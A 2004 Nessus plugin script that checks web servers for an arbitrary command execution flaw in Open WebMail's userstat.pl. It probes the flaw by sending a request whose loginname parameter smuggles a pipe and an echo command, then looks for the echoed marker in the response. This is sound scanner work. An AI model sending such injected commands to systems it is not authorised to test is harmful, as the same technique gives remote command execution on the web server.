#
# This script was written by George A. Theall, <theall@tifaware.com>.
#
# See the Nessus Scripts License for details.
#

if (description) {
  script_id(15529);
  script_version("$Revision: 1.1 $");

# script_cve_id("CVE-MAP-NOMATCH");
# NOTE: no CVE id assigned (gat, 10/2004)
  script_bugtraq_id(10316);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"4201");
  }

  name["english"] = "Open WebMail userstat.pl Arbitrary Command Execution";
  script_name(english:name["english"]);
 
  desc["english"] = "
The target is running at least one instance of Open WebMail in which
the userstat.pl component fails to sufficiently validate user input. 
This failure enables remote attackers to execute arbitrary programs on
the target using the privileges under which the web server operates. 
For further information, see :

  http://www.openwebmail.org/openwebmail/download/cert/advisories/SA-04:01.txt

Solution : Upgrade to Open WebMail version 2.30 20040127 or later.

Risk factor : High";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for Arbitrary Command Execution flaw in Open WebMail's userstat.pl";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2004 George A. Theall");

  family["english"] = "Gain a shell remotely";
  script_family(english:family["english"]);

  script_dependencie("global_settings.nasl", "openwebmail_detect.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

host = get_host_name();
port = get_http_port(default:80);

if (!get_port_state(port)) exit(0);
if (debug_level) display("debug: checking for Arbitrary Command Execution flaw in userstat.pl in Open WebMail on ", host, ":", port, ".\n");

# We test whether the hole exists by trying to echo magic (urlencoded
# as alt_magic for http) and checking whether we get it back.
magic = "userstat.pl is vulnerable";
alt_magic = str_replace(string:magic, find:" ", replace:"%20");

# Check each installed instance, stopping if we find a vulnerability.
installs = get_kb_list(string("www/", port, "/openwebmail"));
if (isnull(installs)) exit(0);
foreach install (installs) {
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    ver = matches[1];
    dir = matches[2];
    if (debug_level) display("debug: checking version ", ver, " under ", dir, ".\n");

    # nb: more interesting exploits are certainly possible, but my
    #     concern is in verifying whether the flaw exists and by
    #     echoing magic along with the phrase "has mail" I can
    #     do that.
    url = string(
      dir, 
      "/userstat.pl?loginname=|echo%20'",
      alt_magic,
      "%20has%20mail'"
    );
    if (debug_level) display("debug: retrieving ", url, "...\n");
    req = http_get(item:url, port:port);
    res = http_keepalive_send_recv(port:port, data:req);
    if (isnull(res)) exit(0);           # can't connect
    if (debug_level) display("debug: res =>>", res, "<<\n");

    if (egrep(string:res, pattern:magic)) {
      security_hole(port);
      exit(0);
    }
  }
}
